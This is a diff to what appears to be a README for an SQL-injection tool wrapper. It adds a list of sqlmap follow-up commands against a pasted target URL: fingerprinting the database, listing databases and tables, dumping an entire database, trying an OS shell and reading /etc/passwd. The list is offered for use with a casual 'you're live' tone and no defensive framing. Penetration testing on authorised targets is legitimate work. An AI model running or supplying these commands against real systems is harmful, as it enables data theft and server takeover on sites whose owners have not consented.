@@ -54,8 +54,28 @@ Paste in your URL when prompted:
             THE FISH
 https://________________com/sqlmap/mysql/get_int.php?id=1
 Boom — you’re live.
+---------------------------------------------------------------------------------------------------------------------
+🧰USEFUL FOLLOW-UP SQLMAP COMMANDS
+You can target specific phases manually:
 
 
+:: Reconfirm DBMS type
+python sqlmap.py -u "URL" --banner
+
+:: List databases
+python sqlmap.py -u "URL" --dbs
+
+:: List tables in a specific DB
+python sqlmap.py -u "URL" -D example_db --tables
+
+:: Dump entire DB
+python sqlmap.py -u "URL" -D example_db --dump
+
+:: Try OS shell
+python sqlmap.py -u "URL" --os-shell
+
+:: Try file read
+python sqlmap.py -u "URL" --file-read=/etc/passwd
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
